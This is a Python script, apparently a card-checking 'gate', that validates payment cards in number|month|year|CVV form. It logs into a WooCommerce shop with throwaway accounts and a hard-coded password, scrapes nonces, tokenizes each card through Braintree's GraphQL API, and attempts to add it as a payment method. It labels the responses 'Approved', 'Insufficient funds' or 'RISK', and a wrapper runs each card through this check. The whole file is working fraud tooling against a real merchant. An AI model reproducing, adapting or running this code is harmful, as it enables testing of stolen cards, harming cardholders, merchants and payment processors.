import random
import string
import time
import uuid
import re
import requests
import base64
import user_agent
import user_agent
user = user_agent.generate_user_agent()


last_used_times = {}
first_line = None
file = open("dummy.txt", "w")  # لو مش محتاج الكتابة ممكن تستخدم io.StringIO()


def br1(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
	session=requests.session()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"

	r = requests.session()




	while True:
	    lines = """zikxcyih@hi2.in
lbwbct@hi2.in
rbnlorm@hi2.in
rkzttl@hi2.in
sdsercs@hi2.in
sugkvpgq@hi2.in
sdsercs@hi2.in
zcgrbw@hi2.in
qrayxgn@hi2.in
suiym@hi2.in
gsvvcyev@hi2.in
rqtnalg@hi2.in
soboan@hi2.in
gefcn@hi2.in
gxsrprx@hi2.in
vkxbgoq@hi2.in
dsldbuik@hi2.in
jxjzqyv@hi2.in
wdkact@hi2.in
govyio@hi2.in
yxlzbuuv@hi2.in
dmpquuzm@hi2.in
lnijhz@hi2.in
lerviwi@hi2.in
uxwkjcsy@hi2.in
czndvije@hi2.in
qcccq@hi2.in
qfiggv@hi2.in
pqimlouw@hi2.in
agabe@hi2.in
eudzi@hi2.in
vfhwll@hi2.in
ifzmwr@hi2.in
moxysqh@hi2.in
yqtszb@hi2.in
ocqveobi@hi2.in
uewhwv@hi2.in
dcqjnfzs@hi2.in
"""
	    lines = lines.strip().split("\n")
	    random_line_number = random.randint(0, len(lines) - 1)
	    cookei = lines[random_line_number]
	    current_time = time.time()
	    url = "https://www.midwestspeakerrepair.com/my-account/"
	    if cookei in last_used_times:
	        time_since_last_use = current_time - last_used_times[cookei]
	        if time_since_last_use < 20:
	            continue  

	    if cookei == first_line:
	        pass
	    else:
	        last_used_times[cookei] = current_time
	        break


	    file.write(cookei)
	    print(cookei)
	headers = {
    'user-agent': user,
}

	response = session.get('https://identityfashion.online/my-account/', cookies=r.cookies, headers=headers)

	login = re.search(r'name="woocommerce-login-nonce" value="(.*?)"',response.text).group(1)

	headers = {
    'user-agent': user,
}

	data = {
    'username': cookei,
    'password': 'Apdlla2006$$',
    'woocommerce-login-nonce': login,
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
}

	response = session.post('https://identityfashion.online/my-account/', cookies=r.cookies, headers=headers, data=data)

	headers = {
    'user-agent': user,
}

	response = session.get('https://identityfashion.online/my-account/add-payment-method/', cookies=r.cookies, headers=headers)

	client = re.search(r'"credit_card","client_token_nonce":"(.*?)",',response.text).group(1)

	add_nonce =re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text).group(1)

	headers = {
    'user-agent': user,
}

	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}

	response = session.post('https://identityfashion.online/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)

	tokn = response.json()['data']

	sn = str (base64.b64decode(tokn))

	btoken = re.findall(r'authorizationFingerprint":"(.*?)"', sn)[0]

	b_token = "Bearer "+btoken


	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': b_token,
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	token = response.json()['data']['tokenizeCreditCard']['token']

	headers = {
    'user-agent': user,
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '20.00',
    'wc_braintree_credit_card_payment_nonce': token,
    'wc_braintree_device_data': '{"correlation_id":"1f51c067854c8b50aed84bb334024885"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = session.post(
    'https://identityfashion.online/my-account/add-payment-method/',
    cookies=r.cookies,
    headers=headers,
    data=data,
)


	text = response.text
	pattern = r'Status code (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		kopi = match.group(1)
		if 'risk_threshold' in kopi:
			return "RISK: Retry this BIN later."
		elif 'You cannot add a new payment method so soon after the previous one' in kopi:
			return "Please wait for 20 seconds."
		elif 'Nice! New payment method added' in kopi or 'Payment method successfully added.' in kopi:
			return '1000: Approved'
		elif 'Duplicate card exists in the vault.' in kopi:
			return 'Approved'
		elif "avs: Gateway Rejected: avs" in kopi or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in kopi or "cvv: Gateway Rejected: cvv" in kopi:
			return 'Insufficient funds'
		elif "Invalid postal code" in kopi or "CVV." in kopi:
			return 'Approved (CVV)'
		elif "Card Issuer Declined CVV" in kopi:
			return 'Approved'
		else:
			return kopi
	else:
		if 'Payment method successfully added.' in text:
			return "1000: Approved"
		elif 'risk_threshold' in text:
			return "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			return "try again"
		else:
			return 'Unknow Response Please Try Again'

# ======================================================
# نظام الـ Map لدعم أكثر من دالة
# ======================================================

GATES_MAP = {
    "Braintree_Auth_V1": br1,
}

def check(card):
    gate_name, gate_func = random.choice(list(GATES_MAP.items()))
    result = gate_func(card)
    return result, gate_name
